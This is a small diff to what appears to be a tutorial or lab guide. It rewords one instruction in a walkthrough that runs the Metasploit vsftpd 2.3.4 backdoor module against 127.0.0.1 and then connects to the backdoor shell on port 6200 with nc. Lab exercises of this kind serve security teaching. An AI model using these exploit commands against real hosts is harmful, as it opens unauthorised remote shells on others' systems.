@@ -182,7 +182,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 127.0.0.1
 run
 ```
-Interrupt it with ctrl+c
+If it's stuck interrupt it with ctrl+c
 
 ```bash
 nc 127.0.0.1 6200
